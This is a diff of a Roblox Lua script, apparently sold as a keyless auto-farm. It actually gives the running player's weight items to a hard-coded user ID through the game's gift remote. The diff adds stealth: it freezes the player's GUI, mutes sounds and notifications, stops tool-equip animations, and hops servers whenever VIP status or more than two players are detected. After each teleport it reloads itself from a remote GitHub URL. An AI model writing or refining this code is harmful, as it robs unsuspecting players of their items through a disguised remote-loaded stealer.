@@ -7,15 +7,20 @@ local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 local backpack = player:WaitForChild("Backpack")
+local PLACE_ID = game.PlaceId
 
 local targetUserId = 9367836539
 local giftRemote = ReplicatedStorage.Shared.Packages.Network.rev_GiftRequest
 local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
 
-local PLACE_ID = game.PlaceId
+--====================================================
+-- 🔥 LOCK SYSTEM (ANTI DOUBLE HOP)
+--====================================================
+
+local hopped = false
 
 --====================================================
--- 🔥 QUEUE SYSTEM (FIXED)
+-- 🔥 QUEUE SYSTEM
 --====================================================
 
 local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
@@ -24,16 +29,14 @@ local function queueSelf()
     if queue_on_teleport then
         queue_on_teleport([[
             repeat task.wait() until game:IsLoaded()
-
-            task.wait(2) -- 🔥 FIX: biar character & backpack ready
-
+            task.wait(2)
             loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
         ]])
     end
 end
 
 --====================================================
--- 🔥 SERVER DETECT
+-- 🔥 SERVER CHECK
 --====================================================
 
 local function getServerType()
@@ -51,8 +54,6 @@ end
 
 local function isBadServer()
     local t = getServerType()
-    print("ServerType:", t)
-
     if not t then return false end
 
     return string.find(t, "vip")
@@ -65,24 +66,19 @@ end
 --====================================================
 
 local function getLowServer()
-    local cursor = ""
+    local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100"
 
-    for i = 1,5 do
-        local url = "https://games.roblox.com/v1/games/"..PLACE_ID.."/servers/Public?sortOrder=Asc&limit=100&cursor="..cursor
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
 
-        local success, result = pcall(function()
-            return HttpService:JSONDecode(game:HttpGet(url))
-        end)
+    if not success or not result or not result.data then
+        return nil
+    end
 
-        if success and result and result.data then
-            for _,server in pairs(result.data) do
-                if server.playing <= 2 and server.playing > 0 then
-                    return server.id
-                end
-            end
-
-            cursor = result.nextPageCursor
-            if not cursor then break end
+    for _,server in pairs(result.data) do
+        if server.playing and server.playing <= 2 then
+            return server.id
         end
     end
 
@@ -90,29 +86,34 @@ local function getLowServer()
 end
 
 --====================================================
--- 🚀 HOP SYSTEM
+-- 🚀 HOP SYSTEM (FIXED LOCK)
 --====================================================
 
 local function hopServer()
+    if hopped then return end
+    hopped = true
+
     queueSelf()
 
     local id = getLowServer()
 
     if id then
-        print("FOUND LOW SERVER → HOP")
+        print("HOP → LOW SERVER")
         TeleportService:TeleportToPlaceInstance(PLACE_ID, id, player)
     else
-        print("FALLBACK SERVER")
+        print("HOP → FALLBACK")
         TeleportService:Teleport(PLACE_ID, player)
     end
 end
 
 --====================================================
--- 🚀 SERVER HANDLER
+-- 🚀 SERVER HANDLER (NO DOUBLE TRIGGER)
 --====================================================
 
 task.spawn(function()
     task.wait(2)
+
+    if hopped then return end
 
     if isBadServer() then
         print("VIP SERVER → HOP")
@@ -129,8 +130,21 @@ task.spawn(function()
     print("GOOD SERVER ✅")
 end)
 
+task.spawn(function()
+    while true do
+        task.wait(5)
+
+        if hopped then break end
+
+        if #Players:GetPlayers() > 2 then
+            hopServer()
+            break
+        end
+    end
+end)
+
 --====================================================
--- 💀 FREEZE GUI (KEEP YOUR ORIGINAL)
+-- 💀 GUI FREEZE (UNCHANGED)
 --====================================================
 
 local gui = player:WaitForChild("PlayerGui")
@@ -170,7 +184,7 @@ RunService.RenderStepped:Connect(function()
 end)
 
 --====================================================
--- 🔇 CLEAN SOUND + NOTIF
+-- 🔇 SOUND + NOTIF CLEAN
 --====================================================
 
 local effects = SoundService:WaitForChild("Effects")
@@ -196,12 +210,28 @@ task.spawn(function()
 end)
 
 --====================================================
--- 🎁 AUTO GIFT SYSTEM (RESTORED + FIXED)
+-- 🎬 ANTI TOOL ANIMATION FIX
 --====================================================
 
 local function getChar()
     return player.Character or player.CharacterAdded:Wait()
 end
+
+local function blockToolAnimations(hum)
+    hum.AnimationPlayed:Connect(function(track)
+        local name = string.lower(track.Name)
+
+        if string.find(name, "tool")
+        or string.find(name, "equip")
+        or string.find(name, "hold") then
+            track:Stop(0)
+        end
+    end)
+end
+
+--====================================================
+-- 🎁 AUTO GIFT SYSTEM (FIXED)
+--====================================================
 
 local function isWeightTool(tool)
     return weightFolder:FindFirstChild(tool.Name) ~= nil
@@ -211,6 +241,8 @@ local function silentEquip(tool)
     local char = getChar()
     local hum = char:FindFirstChildOfClass("Humanoid")
     if not hum then return end
+
+    blockToolAnimations(hum)
 
     hum:EquipTool(tool)
     task.wait()
@@ -245,7 +277,6 @@ local function getRarity(tool)
     end
 end
 
--- 🔥 IMPORTANT FIX: delay start after teleport
 task.wait(2)
 
 while true do
